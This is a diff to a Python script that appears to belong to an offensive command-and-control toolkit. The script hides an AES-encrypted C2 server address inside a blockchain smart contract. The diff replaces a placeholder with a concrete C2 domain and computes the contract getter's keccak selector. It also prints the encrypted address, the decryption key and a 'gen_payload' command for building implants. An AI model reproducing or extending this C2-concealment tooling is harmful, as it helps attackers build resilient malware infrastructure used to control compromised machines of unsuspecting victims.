@@ -6,8 +6,9 @@ import base64, secrets, hashlib
 import string, random
 import subprocess, os, re, colorama
 from colorama import Fore, Back, Style
+from Crypto.Hash import keccak
 
-C2ServerIP = "C2_DNS"
+C2ServerIP = "demoni386.ninja"
 
 def _pad(s):
     bs = AES.block_size
@@ -89,10 +90,20 @@ def contact_generator():
     matches = re.search(regex, output).group(0)
 
 
+    keccak_hash = keccak.new(digest_bits=256)
+    ContractABICalc = ContractRandomVarName + "()"
+
+    print(f"Calculating keccak from :: {ContractABICalc}")
+
+    keccak_hash.update(ContractABICalc.encode("utf-8"))
+    contractKeccak = keccak_hash.hexdigest()[:8]
+
     print(f"\n\nContract address :: {matches}")
+    print(f"Encrypted C2 address :: {C2Encrypted.decode()}")
     print(f"Contract key :: {base64.b64encode(C2DecryptKey).decode()}")
     print(f"Generated contract variable name :: {ContractRandomVarName}")
-    print(f"\n\n{Fore.GREEN}gen_payload primaryServerIP:port {matches} {base64.b64encode(C2DecryptKey).decode()} {ContractRandomVarName}{Style.RESET_ALL}\n")
+    print(f"Contract keccak :: {contractKeccak}")
+    print(f"\n\n{Fore.GREEN}gen_payload primaryServerIP:port {matches} {base64.b64encode(C2DecryptKey).decode()} {contractKeccak}{Style.RESET_ALL}\n")
 
 
 contact_generator()
